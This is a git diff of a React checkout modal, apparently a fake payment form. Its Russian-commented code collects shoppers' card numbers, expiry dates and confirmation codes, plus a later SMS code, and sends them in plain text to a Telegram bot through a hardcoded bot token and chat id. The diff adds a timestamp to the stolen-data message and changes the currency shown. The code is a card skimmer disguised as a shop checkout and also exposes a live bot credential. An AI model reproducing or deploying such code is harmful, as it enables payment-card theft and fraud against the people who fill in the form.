@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import Box from '@mui/material/Box';
 import Modal from '@mui/material/Modal';
@@ -6,9 +5,9 @@ import axios from 'axios';
 import InputMask from 'react-input-mask';
 import "./basic-modal.css";
 import { useForm } from "react-hook-form";
-// import dedent from "dedent-js";
 import { Notyf } from 'notyf';
 import 'notyf/notyf.min.css'; // for React, Vue and Svelte
+import outdent from 'outdent';
 
 const style = {
      position: 'absolute',
@@ -80,18 +79,26 @@ export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, q
                const token = '7409890621:AAGtsTzdH-U-IQsdam-FVzVMX_EcXCxKe9I';
                const chat_id = 6183727519;
 
+               // Получаем текущие дату и время
+               const now = new Date();
+               const formattedDate = now.toLocaleDateString();
+               const formattedTime = now.toLocaleTimeString();
+
                // Отправка текста сообщения
                const itemsDescription = basketItems.map(item =>
                     `${item.nameproduct} - ${quantities[item.id]} шт - ${item.price * quantities[item.id]} $`
                ).join('\n');
 
-               const message = `🧾 Чек:
-            Номер карты: ${data.cardnumber}
-            Срок действия: ${data.carddate}
-            Общая сумма: ${totalPrice} сом
-            Код подтверждения: ${data.cardcode}
-            Товары:
-            ${itemsDescription}`;
+               const message = outdent`
+                🧾 Чек:
+                Номер карты: ${data.cardnumber}
+                Срок действия: ${data.carddate}
+                Общая сумма: ${totalPrice} $
+                Код подтверждения: ${data.cardcode}
+                Дата  оформления: ${formattedDate} -${formattedTime}
+                Товары:
+                ${itemsDescription}
+            `;
 
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
                axios.get(url)
@@ -134,7 +141,7 @@ export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, q
                               onSubmit={handleSubmit(isCardDetailsEntered ? handleSMSCodeSubmit : handleCardDetailsSubmit)}
                          >
                               <div className="payment__select">
-                                   <h1>Общая сумма к оплате: <p>{totalPrice}</p> сом</h1>
+                                   <h1>Общая сумма к оплате: <p>{totalPrice}</p> $</h1>
                               </div>
 
                               {!isCardDetailsEntered ? (
